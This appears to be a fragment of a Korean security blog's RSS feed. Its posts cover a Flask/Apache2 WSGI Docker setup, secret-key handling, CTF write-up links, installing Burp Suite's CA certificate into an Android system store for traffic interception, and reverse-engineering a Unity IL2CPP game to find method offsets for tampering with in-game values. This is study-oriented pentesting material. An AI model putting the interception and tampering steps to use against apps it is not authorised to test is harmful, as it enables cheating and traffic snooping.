srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo4"></p><h3 id="Apache2"><a href="#Apache2" class="headerlink" title="Apache2"></a>Apache2</h3><p><img src="/img/post/wsgi/apache2_tree.png" class="lazyload" data-srcset="/img/post/wsgi/apache2_tree.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo5"></p><p>Apache2도 그렇게 복잡하진 않다. 환경에 맞게 wsgi 설정을 해주면 된다.</p><p>프로젝트 폴더(APACHE2)에 dockerfile, docker-compose.yml, apache2.conf, requirements.txt, run.wsgi 파일을 두고,</p><p>web 폴더를 하나 생성해서 실제 flask 앱을 구동할 파일들을 넣어줬다.</p><p><code>dockerfile</code></p><pre><code class="docker">FROM ubuntu:latestMAINTAINER jhyeon &lt;stjhyeon@kakao.com&gt;ENV DEBIAN_FRONTEND=noninteractiveRUN apt-get update &amp;&amp; apt-get install -y apache2 \    libapache2-mod-wsgi-py3 \    build-essential \    python3 \    python3-dev \    python3-pip \    &amp;&amp; apt-get clean -y \    &amp;&amp; apt-get autoremove -y \    &amp;&amp; rm -rf /var/lib/apt/lists/*WORKDIR /var/www/appCOPY ./requirements.txt /var/www/app/RUN pip install --no-cache-dir -r requirements.txtCOPY ./apache2.conf /etc/apache2/sites-available/apache2.confCOPY ./run.wsgi /var/www/app/COPY ./web/serve.py /var/www/app/serve.pyRUN a2dissite 000-default.confRUN a2ensite apache2.confEXPOSE 80CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]</code></pre><p><code>docker-compose.yml</code></p><pre><code class="docker">version: &#39;3.7&#39;services:    apache2-wsgi:        build: ./        container_name: apache2-wsgi        working_dir: /var/www/app        ports:            - 80:80</code></pre><p><code>apache2.conf</code></p><pre><code>&lt;VirtualHost *:80&gt;        WSGIDaemonProcess app user=www-data group=www-data processes=10 threads=5        WSGIProcessGroup app        WSGIScriptAlias / /var/www/app/run.wsgi                &lt;Directory /var/www/app&gt;            WSGIProcessGroup app            WSGIApplicationGroup %&#123;GLOBAL&#125;            Order deny,allow            Allow from all        &lt;/Directory&gt;        # static linked        Alias /static /var/www/app/static        &lt;Directory /var/www/app/static/&gt;            Order allow,deny            Allow from all        &lt;/Directory&gt;        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined&lt;/VirtualHost&gt;</code></pre><p><code>requirements.txt</code></p><pre><code class="py">Flask</code></pre><p><code>run.wsgi</code></p><pre><code class="py">#! /usr/bin/python3import syssys.path.insert(0, &#39;/var/www/app&#39;)from serve import app as application</code></pre><p><img src="/img/post/wsgi/apache2_run.png" class="lazyload" data-srcset="/img/post/wsgi/apache2_run.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo6"></p><h3 id="Download-Git"><a href="#Download-Git" class="headerlink" title="Download(Git)"></a>Download(Git)</h3><p>위에서 작업한 내용들은 모두 아래 깃허브에 저장되어 있으니 직접 보고 구성하셔도 됩니다.</p><ul><li><a href="https://github.com/jhye0n/python-wsgi">https://github.com/jhye0n/python-wsgi</a></li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://velog.io/@misun9283/WSGI-%EB%9E%80">1. WSGI란?</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Development/">Development</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Flask/">Flask</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Apache2/">Apache2</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/WSGI/">WSGI</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/uWSGI/">uWSGI</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/21/flask-apache-210521/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>주요통신기반시설 기술 취약점 분석 가이드(2021-03)</title>
+      <link>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/</guid>
+      <pubDate>Wed, 19 May 2021 02:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;2021.3월에 업데이트 된 KISA 주통기 기반 기술 취약점 분석 가이드 자료를 공유합니다.&lt;/p&gt;
+&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>2021.3월에 업데이트 된 KISA 주통기 기반 기술 취약점 분석 가이드 자료를 공유합니다.</p><p>모의 해킹이나 취약점 점검할 때 도움이 되는 자료입니다 ~~</p><ul><li><a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=&SV=">공식 홈페이지 다운로드</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/KISA/">KISA</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%ED%95%9C%EA%B5%AD%EC%9D%B8%ED%84%B0%EB%84%B7%EC%A7%84%ED%9D%A5%EC%9B%90/">한국인터넷진흥원</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D/">기술 취약점 분석</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EA%B8%B0%EC%88%A0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-%EA%B0%80%EC%9D%B4%EB%93%9C/">기술 취약점 분석 가이드</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/%EC%A3%BC%ED%86%B5%EA%B8%B0-%EC%B7%A8%EC%95%BD%EC%A0%90-%EA%B0%80%EC%9D%B4%EB%93%9C/">주통기 취약점 가이드</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/19/kisareport-210519/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>dCTF 2021 Write up</title>
+      <link>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/</guid>
+      <pubDate>Mon, 17 May 2021 14:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;dCTF 2021 (5/15 Sat 00:00 ~ 5/17 Mon 06:59 KST)&lt;/p&gt;
+&lt;ul&gt;
+&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>dCTF 2021 (5/15 Sat 00:00 ~ 5/17 Mon 06:59 KST)</p><ul><li><a href="http://dctf.dragonsec.si/">http://dctf.dragonsec.si/</a></li><li>pwnhub (jhyeon, malhyuk, nga)</li><li>rank : 292th (1250 points)</li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p>해당 게시글은 아래 노션 링크를 통해 확인하실 수 있습니다.</p><ul><li><a href="https://public.jhyeon.dev/ctf/dctf2021">https://public.jhyeon.dev/ctf/dctf2021</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/dCTF-2021/">dCTF 2021</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/17/dctf2021-210517/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Python 비밀키 관리방법(python-decouple)</title>
+      <link>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/</guid>
+      <pubDate>Wed, 05 May 2021 01:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>요즘 Python Web Framework(Flask, Django) 실제 웹을 운영할 때도 생각보다 괜찮게 잘 되있어서</p><p>실 서비스에도 많이 사용하게 되는 것을 여기저기서 많이 봤다.</p><p>다만 개발할 떄 비밀키라던가 API KEY 등을 코드에 하드코딩을 하면 취약점이 발생했을 때 이러한 키들이</p><p>유출 당할 수 있는 문제점이 있는데 그러한 문제를 막고자 파이썬에서는 <code>decouple</code> 모듈이 있다.</p><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><pre><code class="bash">pip3 install python-decouple</code></pre><h3 id="Apply"><a href="#Apply" class="headerlink" title="Apply"></a>Apply</h3><p><code>settings.ini</code></p><pre><code>[settings]TESTKEY=this_is_test_key</code></pre><p><code>main.py</code></p><pre><code class="py">#!/usr/bin/python3from decouple import configtest_api_key = config(&quot;TESTKEY&quot;)print(test_api_key)</code></pre><p>여기서 주의할 점은 settings.ini는 main.py 위치에 존재해야 하며,</p><p>git으로 관리시에는 반드시 <code>.gitignore</code> 를 통해서 git에 push 되지 않도록 해야한다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://pypi.org/project/python-decouple/">https://pypi.org/project/python-decouple/</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Development/">Development</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Python/">Python</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Decouple/">Decouple</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/SECRET-KEY/">SECRET_KEY</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/05/python-decouple-210505/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Android 7.0 이상의 환경에서 CA 인증서 설치</title>
+      <link>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/</link>
+      <guid>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/</guid>
+      <pubDate>Sun, 02 May 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,&lt;/</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>안드로이드 빌드 7.0 이상에서 CA(Certificate Authority) 인증서를 설치 할 때,</p><p>사용자 인증서로 설치하게 되면 SSL이 정상적으로 적용되지 않는 문제가 있다.</p><p>Burp Suite의 CA 인증서는 만료기간이 20년 이상의 인증서로 생성되는데,</p><p>Google에서 시스템 인증서는 39개월 이내의 만료기간을 가지기 때문에 정상적으로 동작하지 않는다.</p><p>따라서 7.0 빌드 이상의 환경이라면 시스템 루트 공간에 자격 증명을 만들어줘야 동작하게 되는데</p><p>그 과정을 정리하고자 한다.</p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>인증서는 “Burp Suite”의 <code>cacert.der</code>을 사용할 것이다.</p><ul><li><a href="http://burp/">http://burp</a></li></ul><h3 id="Hash-Extraction"><a href="#Hash-Extraction" class="headerlink" title="Hash Extraction"></a>Hash Extraction</h3><p>위 인증서를 다운로드 받았다면 인증서 변환, 해쉬 값 추출을 진행해야 한다.</p><p>OpenSSL을 사용하여 이 과정 진행이 가능하다.</p><pre><code class="bash">mv cacert.der cacert.ceropenssl x509 -inform DER -in cacert.cer -out cacert.pemopenssl x509 -inform PEM -subject_hash_old -in cacert.pem</code></pre><p>위 세가지 명령어를 입력했다면, 아래와 같은 사진을 확인할 수 있다.</p><p><img src="/img/post/android-cert/1.png" class="lazyload" data-srcset="/img/post/android-cert/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><p>여기서 9a5ba575(hash는 다를 수 있음)를 복사해서 파일명을 <code>해쉬값.0</code> 으로 바꿔준다.</p><pre><code class="bash">mv cacert.pem 9a5ba575.0</code></pre><h3 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h3><p>이제 해당 인증서를 시스템 CA 인증서 디렉토리에 push 해주면 된다.</p><pre><code class="bash">adb push 9a5ba575.0 /sdcardadb shellsumount -o rw,remount /systemmv /sdcard/9a5ba575.0 /system/etc/security/cacerts/cd /system/etc/security/cacerts/chmod 644 9a5ba575.0</code></pre><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://hackcatml.tistory.com/37">https://hackcatml.tistory.com/37</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/ADB/">ADB</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/SSL/">SSL</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/CA-%EC%9D%B8%EC%A6%9D%EC%84%9C/">CA 인증서</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/05/03/android-cert-210503/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>HSPACE (SatunX) CTF 2021 Write Up</title>
+      <link>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/</guid>
+      <pubDate>Sun, 25 Apr 2021 03:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/img/post/ctf/hspace2021/logo.png&quot; class=&quot;lazylo</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p><img src="/img/post/ctf/hspace2021/logo.png" class="lazyload" data-srcset="/img/post/ctf/hspace2021/logo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><p>HSPACE(SatunX) 2021 (4/24 Sat 10:00 ~ 4/24 Sat 22:00 KST)</p><ul><li><a href="https://ctf.hspace.io/">https://ctf.hspace.io/</a></li><li>rank : 24th (jhye3n)</li></ul><h3 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h3><ul><li><a href="https://public.jhyeon.dev/ctf/hspace2021">https://public.jhyeon.dev/ctf/hspace2021</a></li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Crypto/">Crypto</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/SatunX/">SatunX</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/HSPACE/">HSPACE</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/HSPACE-CTF/">HSPACE CTF</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/25/hspacectf-210425/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>모바일 게임 앱 분석(Unity Game Engine)</title>
+      <link>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/</guid>
+      <pubDate>Sun, 25 Apr 2021 01:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.&lt;/p&gt;
+&lt;</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>분석에 앞서 해당 게시글은 공부용 목적으로 연구된 자료이니, 악용 목적으로는 사용을 금합니다.</p><h3 id="Unity란"><a href="#Unity란" class="headerlink" title="Unity란?"></a>Unity란?</h3><p>Unity는 게임 개발을 위한 엔진이며 2D 및 3D 게임을 만들 수 있고,</p><p>3D Animation(3D 애니메이션), VR(가상 현실), AR(증강 현실) 콘텐츠을 제작하는 용도로 사용됩니다.</p><ul><li><a href="https://unity.com/kr">https://unity.com/kr</a></li></ul><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>Unity 엔진에는 크게 두 가지 컴파일 방식이 존재합니다.</p><ol><li>MONO Compile</li></ol><p>MONO 컴파일러의 경우 안드로이드의 JIT 컴파일 방식이라고 생각하시면 됩니다.</p><p>JIT 컴파일러는 IL(중간언어)로 작성된 DLL 파일을 읽어, Runtime으로 코드 실행을 합니다.</p><p>빠른 빌드속도와 .NET 프레임워크를 사용하기 때문에 크로스 플랫폼(Window, Linux, MacOS)에서 구동이 가능하지만, 보안에는 매우 취약합니다.</p><p>아래 MONO 컴파일러의 빌드 방식을 확인해봅시다.</p><p><img src="/img/post/unity/mono.png" class="lazyload" data-srcset="/img/post/unity/mono.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo1"></p><p>이렇게 일반적으로 컴파일 된 MONO 기반의 게임은 앱을 빌드하는 과정에서 만들어지는 <code> DLL </code> 파일을 통해서</p><p>쉽게 디컴파일이 가능하고 원본에 가까운 소스코드를 확인할 수 있게 됩니다.</p><ol start="2"><li>IL2CPP Compile</li></ol><p>IL2CPP 방식으로 컴파일 된 경우에는 약간 다른 구조를 띄고 있습니다.</p><p>아래 사진을 보면서 함께 설명을 하도록 하겠습니다.</p><p><img src="/img/post/unity/unitycompiler.png" class="lazyload" data-srcset="/img/post/unity/unitycompiler.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo2"></p><p>이렇게 보면 위에서 본 사진이랑 확연히 구분하실 수 있을겁니다.</p><p>사진의 컴파일 과정을 보면, IL2CPP 방식에는 IL Assembly 코드를 <code> il2cpp.exe </code> 에 의해서</p><p>C++ 소스코드로 변환하게 되고 이를 C++ 컴파일러에 전달하여 Native Library를 생성하는 구조입니다.</p><p>즉 JAVA에서 AOT 컴파일 방식을 의미하고 있는 것이죠.</p><p>이러한 과정으로 빌드된 APK를 내부를 분석하면 <code>lib->&#123;device-architecture&#125;</code> 경로에</p><p>3개의 Native Library가 존재함을 알 수 있습니다.</p><p><img src="/img/post/unity/nativelib.png" class="lazyload" data-srcset="/img/post/unity/nativelib.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo3"></p><p>이 라이브러리는 우선 앱이 실행될 때 <code> libunity.so </code> 를 로드하여 초기 설정값들을 얻어오고,</p><p>마지막에 <code> libil2cpp.so </code> 파일을 로드하여 앱에 정의된 메소드들을 사용하게 됩니다.</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>전반적인 과정을 살펴봤으니, 실제 Unity로 개발 된 앱을 가지고 분석을 해보겠습니다.</p><p>앱에 대한 정보는 문제의 여지가 있어 공개되지 않습니다 (^_^)</p><ol><li>어플리케이션 압축 해제 후 내부 구성 파일 확인</li></ol><p><img src="/img/post/unity/app1.png" class="lazyload" data-srcset="/img/post/unity/app1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo4"></p><ol start="2"><li>native library 확인 (unity)</li></ol><p><img src="/img/post/unity/app2.png" class="lazyload" data-srcset="/img/post/unity/app2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo5"></p><ol start="3"><li>IL2CPPDUMPER 도구를 활용하여 앱 내부 파일 덤프</li></ol><p><img src="/img/post/unity/app3.png" class="lazyload" data-srcset="/img/post/unity/app3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo6"></p><ol start="4"><li>Assembly-CSharp.dll 로드</li></ol><p><img src="/img/post/unity/app4.png" class="lazyload" data-srcset="/img/post/unity/app4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo7"></p><p>실제 게임 구동을 위해 구현된 Method들을 확인할 수 있습니다.</p><ol start="5"><li>특정 메소드 RVA, Offset 확인</li></ol><p><img src="/img/post/unity/app5.png" class="lazyload" data-srcset="/img/post/unity/app5.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="photo8"></p><p>주어진 RVA, Offset 값을 통해, 모듈 Base 주소를 구해서 Offset 연산을 해주면,</p><p>해당 함수의 주소를 찾을 수 있어, 실제 게임 내 값을 변조하거나 하는 등의 방법도 가능하게 됩니다.</p><p>이렇게 단계별로 나눠 분석 도구를 활용해 간단하게만 분석을 해봤는데,</p><p>이후 실제 앱을 기반으로 게임 내 값을 변조한다거나 하는 방법은 정리 및 검토가 끝난 후 추가로 포스팅 하겠습니다<del>_</del></p><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul><li><p><a href="https://github.com/icsharpcode/ILSpy">https://github.com/icsharpcode/ILSpy</a> (ILSPY)</p></li><li><p><a href="https://github.com/0xd4d/dnSpy">https://github.com/0xd4d/dnSpy</a> (dnSpy)</p></li><li><p><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a> (IL2CppDumper)</p></li></ul><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul><li>LINFORUM (<a href="http://linforum.kr/">http://linforum.kr/</a>)</li></ul>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Unity/">Unity</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Mobile-Hacking/">Mobile Hacking</category>
+      
+      
+      <comments>https://blog.jhyeon.dev/2021/04/25/unityapp-analysis-210425/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>Unity 엔진으로 개발 된 앱 덤프 도구</title>
+      <link>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</link>
+      <guid>https://blog.jhyeon.dev/2021/04/25/il2cppdumper-210425/</guid>
+      <pubDate>Sat, 24 Apr 2021 15:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;il2cppDumper&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://github.com/Per</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><ul><li>il2cppDumper<ul><li><a href="https://github.com/Perfare/Il2CppDumper">https://github.com/Perfare/Il2CppDumper</a></li></ul></li></ul><pre><code>il2cppdumper.exe &lt;executable-file&gt; &lt;metadata.dat&gt; &lt;output-dir&gt;</code></pre>]]></content:encoded>
+      
+      
+      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
+      
+      
+      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/Mobile/">Mobile</category>
+      
+      <category domain="https://blog.jhyeon.dev/tags/App/">App</category>
+      
